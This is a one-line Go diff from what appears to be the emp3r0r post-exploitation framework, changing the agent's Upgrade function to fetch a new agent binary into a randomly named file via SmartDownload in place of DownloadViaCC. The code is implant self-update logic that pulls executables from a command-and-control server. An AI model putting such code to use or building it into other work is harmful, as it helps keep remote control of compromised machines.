@@ -151,7 +151,7 @@ func CollectSystemInfo() *emp3r0r_data.AgentSystemInfo {
 
 func Upgrade(checksum string) (out string) {
 	tempfile := RuntimeConfig.AgentRoot + "/" + util.RandStr(util.RandInt(5, 15))
-	_, err := DownloadViaCC("agent", tempfile)
+	_, err := SmartDownload("agent", tempfile)
 	if err != nil {
 		return fmt.Sprintf("Error: Download agent: %v", err)
 	}
